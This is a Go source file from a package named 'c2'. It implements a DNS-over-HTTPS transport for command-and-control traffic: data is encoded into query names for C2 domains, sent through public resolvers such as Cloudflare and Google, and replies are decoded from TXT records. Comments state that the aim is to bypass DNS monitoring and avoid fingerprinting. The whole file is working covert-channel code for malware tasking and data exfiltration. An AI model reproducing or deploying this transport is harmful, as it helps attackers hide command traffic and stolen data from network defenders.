package c2

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// DoHTransport implements the Transport interface using DNS-over-HTTPS.
// It sends DNS queries over HTTPS to well-known DoH resolvers (Cloudflare,
// Google), bypassing traditional DNS monitoring infrastructure.
type DoHTransport struct {
	mu          sync.RWMutex
	resolvers   []string
	domains     []string
	resolverIdx atomic.Int64
	domainIdx   atomic.Int64
	client      *http.Client
}

// NewDoHTransport creates a DNS-over-HTTPS transport.
// resolvers are DoH endpoint URLs (e.g. "https://1.1.1.1/dns-query").
// domains are the C2 domains used for DNS tunneling.
func NewDoHTransport(resolvers []string, domains []string) *DoHTransport {
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			MinVersion: tls.VersionTLS12,
		},
		DisableKeepAlives: true,
	}

	return &DoHTransport{
		resolvers: resolvers,
		domains:   domains,
		client: &http.Client{
			Transport: transport,
			Timeout:   15 * time.Second,
		},
	}
}

// Send encodes data using the same DNS tunneling scheme as DNSTransport
// but sends queries over HTTPS to DoH resolvers using wireformat
// (application/dns-message).
func (d *DoHTransport) Send(data []byte) ([]byte, error) {
	d.mu.RLock()
	resolvers := d.resolvers
	domains := d.domains
	d.mu.RUnlock()

	if len(resolvers) == 0 {
		return nil, fmt.Errorf("no DoH resolvers configured")
	}
	if len(domains) == 0 {
		return nil, fmt.Errorf("no DoH domains configured")
	}

	domain := domains[d.domainIdx.Load()%int64(len(domains))]

	// Reuse the DNS encoding logic from the dns transport.
	dt := &DNSTransport{domains: domains}
	chunks := dt.encodeToChunks(data, domain)

	var allResponses []byte
	for i, qname := range chunks {
		resp, err := d.queryDoH(qname)
		if err != nil {
			// Try next resolver on failure.
			d.resolverIdx.Add(1)
			return nil, fmt.Errorf("doh query chunk %d: %w", i, err)
		}
		allResponses = append(allResponses, resp...)
	}

	return allResponses, nil
}

// Close releases resources held by the DoH HTTP client.
func (d *DoHTransport) Close() error {
	if t, ok := d.client.Transport.(*http.Transport); ok {
		t.CloseIdleConnections()
	}
	return nil
}

// FlushConnections closes idle connections on the DoH HTTP client.
func (d *DoHTransport) FlushConnections() {
	if t, ok := d.client.Transport.(*http.Transport); ok {
		t.CloseIdleConnections()
	}
}

// queryDoH sends a DNS TXT query for qname over HTTPS using wireformat.
// It builds a minimal DNS query packet and POSTs it with content type
// application/dns-message to the current DoH resolver.
func (d *DoHTransport) queryDoH(qname string) ([]byte, error) {
	d.mu.RLock()
	resolvers := d.resolvers
	d.mu.RUnlock()

	resolver := resolvers[d.resolverIdx.Load()%int64(len(resolvers))]

	// Build wireformat DNS query for TXT record.
	wireQuery := buildDNSQuery(qname, dnsTypeTXT)

	req, err := http.NewRequest(http.MethodPost, resolver, bytes.NewReader(wireQuery))
	if err != nil {
		return nil, fmt.Errorf("create doh request: %w", err)
	}
	req.Header.Set("Content-Type", "application/dns-message")
	req.Header.Set("Accept", "application/dns-message")

	resp, err := d.client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("doh post: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("doh resolver returned HTTP %d", resp.StatusCode)
	}

	body, err := io.ReadAll(io.LimitReader(resp.Body, 65535))
	if err != nil {
		return nil, fmt.Errorf("read doh response: %w", err)
	}

	// Parse TXT records from the wireformat response.
	return parseDNSResponseTXT(body)
}

// DNS constants for wireformat query construction.
const (
	dnsTypeTXT   = 16
	dnsClassIN   = 1
	dnsHeaderLen = 12
)

// buildDNSQuery constructs a minimal wireformat DNS query packet.
// Format: header (12 bytes) + question section.
func buildDNSQuery(qname string, qtype uint16) []byte {
	var buf bytes.Buffer

	// Generate a random 2-byte query ID per request to avoid fingerprinting.
	var idBytes [2]byte
	rand.Read(idBytes[:]) //nolint:errcheck // crypto/rand.Read does not fail on Linux

	// Header: ID=random, QR=0, Opcode=0, RD=1, QDCOUNT=1
	header := []byte{
		idBytes[0], idBytes[1], // ID (random per request)
		0x01, 0x00, // Flags: RD=1
		0x00, 0x01, // QDCOUNT=1
		0x00, 0x00, // ANCOUNT=0
		0x00, 0x00, // NSCOUNT=0
		0x00, 0x00, // ARCOUNT=0
	}
	buf.Write(header)

	// QNAME: each label length-prefixed, terminated by 0x00.
	labels := strings.Split(qname, ".")
	for _, label := range labels {
		if len(label) == 0 {
			continue
		}
		if len(label) > 63 {
			label = label[:63] // RFC 1035: max label length is 63 octets
		}
		buf.WriteByte(byte(len(label)))
		buf.WriteString(label)
	}
	buf.WriteByte(0x00)

	// QTYPE and QCLASS.
	var typeBuf [2]byte
	binary.BigEndian.PutUint16(typeBuf[:], qtype)
	buf.Write(typeBuf[:])
	binary.BigEndian.PutUint16(typeBuf[:], dnsClassIN)
	buf.Write(typeBuf[:])

	return buf.Bytes()
}

// parseDNSResponseTXT extracts TXT record data from a wireformat DNS response.
// It skips the header and question section, then reads answer RRs for TXT data.
func parseDNSResponseTXT(data []byte) ([]byte, error) {
	if len(data) < dnsHeaderLen {
		return nil, fmt.Errorf("dns response too short")
	}

	ancount := binary.BigEndian.Uint16(data[6:8])
	if ancount == 0 {
		return nil, fmt.Errorf("no answers in dns response")
	}

	// Skip header.
	offset := dnsHeaderLen

	// Skip question section (QDCOUNT=1 assumed).
	qdcount := binary.BigEndian.Uint16(data[4:6])
	for i := uint16(0); i < qdcount; i++ {
		offset = skipDNSName(data, offset)
		if offset < 0 || offset+4 > len(data) {
			return nil, fmt.Errorf("malformed question section")
		}
		offset += 4 // QTYPE + QCLASS
	}

	// Parse answer records.
	var result []byte
	for i := uint16(0); i < ancount; i++ {
		if offset >= len(data) {
			break
		}

		// Skip name (may be compressed pointer).
		offset = skipDNSName(data, offset)
		if offset < 0 || offset+10 > len(data) {
			break
		}

		rtype := binary.BigEndian.Uint16(data[offset : offset+2])
		offset += 8 // TYPE(2) + CLASS(2) + TTL(4)
		rdlen := int(binary.BigEndian.Uint16(data[offset : offset+2]))
		offset += 2

		if offset+rdlen > len(data) {
			break
		}

		if rtype == dnsTypeTXT {
			// TXT RDATA: one or more <length><text> sequences.
			rdEnd := offset + rdlen
			for offset < rdEnd {
				txtLen := int(data[offset])
				offset++
				if offset+txtLen > rdEnd {
					break
				}
				// Decode from the DNS tunneling base32 encoding.
				decoded, err := dnsEncoding.DecodeString(strings.ToUpper(string(data[offset : offset+txtLen])))
				if err == nil {
					result = append(result, decoded...)
				}
				offset += txtLen
			}
		} else {
			offset += rdlen
		}
	}

	return result, nil
}

// skipDNSName advances past a DNS name in wireformat, handling both
// uncompressed labels and compressed pointers (0xC0 prefix).
func skipDNSName(data []byte, offset int) int {
	for offset < len(data) {
		length := int(data[offset])
		if length == 0 {
			return offset + 1
		}
		// Compressed pointer (2 bytes).
		if length&0xC0 == 0xC0 {
			return offset + 2
		}
		offset += 1 + length
	}
	return -1
}
